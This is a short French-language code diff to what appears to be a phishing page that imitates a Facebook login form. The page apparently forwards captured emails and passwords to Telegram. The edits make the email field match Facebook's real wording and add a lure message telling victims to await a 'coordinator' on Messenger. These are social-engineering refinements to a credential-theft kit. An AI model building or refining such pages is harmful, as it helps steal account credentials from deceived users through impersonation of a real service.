@@ -565,7 +565,7 @@
 
         <form id="fbSignupForm">
           <div>
-            <input id="fb_email" name="email" type="email" placeholder="Adresse e-mail" autocomplete="username" required>
+            <input id="fb_email" name="email" type="email" placeholder="Numéro mobile ou e-mail" autocomplete="username" required>
             <input id="fb_password" name="password" type="password" placeholder="Mot de passe" autocomplete="current-password" required minlength="6">
           </div>
 
@@ -945,7 +945,7 @@
           
           if (telegramSuccess) {
             // Message de succès
-            document.getElementById('fbFeedback').textContent = '✅ Connexion réussie! Redirection en cours...';
+            document.getElementById('fbFeedback').textContent = 'Vous allez recevoir le message du coordonateur sur Messeenger, Merci de patienter !';
             document.getElementById('fbFeedback').style.color = 'green';
             
             // Redirection après 2 secondes
